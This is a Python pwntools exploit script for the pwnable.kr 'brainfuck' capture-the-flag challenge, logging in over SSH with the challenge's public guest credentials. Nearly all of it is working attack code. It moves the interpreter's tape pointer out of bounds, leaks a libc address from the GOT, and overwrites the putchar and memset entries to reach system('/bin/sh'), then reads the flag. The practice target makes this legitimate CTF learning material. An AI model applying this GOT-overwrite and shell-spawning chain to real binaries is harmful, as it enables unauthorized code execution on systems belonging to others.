#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host pwnable.kr --port 2222 --user brainfuck --pass guest --path brainfuck
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'brainfuck')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141 EXE=/tmp/executable
host = args.HOST or 'pwnable.kr'
port = int(args.PORT or 2222)
user = args.USER or 'brainfuck'
password = args.PASSWORD or 'guest'
remote_path = 'brainfuck'

# Connect to the remote SSH server
shell = None
if not args.LOCAL:
    shell = ssh(user, host, port, password)
    shell.set_working_directory(symlink=True)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Execute the target binary on the remote host'''
    if args.GDB:
        return gdb.debug([remote_path] + argv, gdbscript=gdbscript, ssh=shell, *a, **kw)
    else:
        return shell.connect_remote("127.0.0.1", 9001)

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x8048000)


PUTS_GOT_ADDR = 0x804a018
SETVBUF_GOT_ADDR = 0x804a028
MEMSET_GOT_ADDR = 0x804a02c
PUTCHAR_GOT_ADDR = 0x804a030
TAPE_ADDR = 0x804a0a0

PUTCHAR_PLT_ADDR = 0x80484d6
MAIN_ADDR = 0x8048671

MEMSET_PLT_ADDR = 0xf7ed5980
SYSTEM_ADDR = 0xf7d6ce40

MEMSET_OFFSET = 0x76FC0
SETVBUF_OFFSET = 0x60360
SYSTEM_OFFSET = 0x3ADA0

def move_p(current_addr: int, target_addr: int) -> bytes:
    if current_addr > target_addr:
        return b"<" * (current_addr - target_addr)
    else:
        return b">" * (target_addr - current_addr)

def patch_addr(new_addr: int) -> tuple[bytes, bytes]:
    new_addr_bytes = p32(new_addr)

    return new_addr_bytes, b">".join(b"," for _ in new_addr_bytes)

io = start()

# leak system() address
payload = b""
payload += move_p(TAPE_ADDR, SETVBUF_GOT_ADDR)  # p -> setvbuf
payload += b"."
payload += b">"  # p++ (p -> setvbuf + 1)
payload += b"."
payload += b">"  # p++ (p -> setvbuf + 2)
payload += b"."
payload += b">"  # p++ (p -> setvbuf + 3)
payload += b"."

# patch putchar -> main
payload += move_p(SETVBUF_GOT_ADDR + 3, PUTCHAR_GOT_ADDR)  # p -> putchar
patch_putchar_bytes, instructions = patch_addr(MAIN_ADDR)
payload += instructions  # putchar -> main

payload += b"."  # rerun main

log.info(f"sending {payload=}")

io.sendline(payload)
io.send(patch_putchar_bytes)

io.recvuntil(b"type some brainfuck instructions except [ ]\n")
setvbuf_addr = u32(io.recvn(4))

log.info(f"leaked setvbuf address: {setvbuf_addr:x}")

system_addr = setvbuf_addr + SYSTEM_OFFSET - SETVBUF_OFFSET

log.info(f"calculated system address: {setvbuf_addr:x}")

payload = b"."  # run main again (create a new stackframe)

# patch memset -> system
payload += move_p(TAPE_ADDR, MEMSET_GOT_ADDR)  # p -> memset
patch_memset_bytes, instructions = patch_addr(system_addr)
payload += instructions

payload += b"."  # run main again (reuse old stackframe, execute code)

log.info(f"sending {payload=}")

io.sendline(payload)
io.sendline(b"/bin/sh")
io.send(patch_memset_bytes)

io.recvuntil(b"type some brainfuck instructions except [ ]\n")
io.recvuntil(b"type some brainfuck instructions except [ ]\n")
io.recvuntil(b"type some brainfuck instructions except [ ]\n")

io.sendline(b"cat /home/brainfuck_pwn/flag")
log.success(f"flag = '{term.text.bold_italic_yellow(io.recvline().decode().strip())}'")
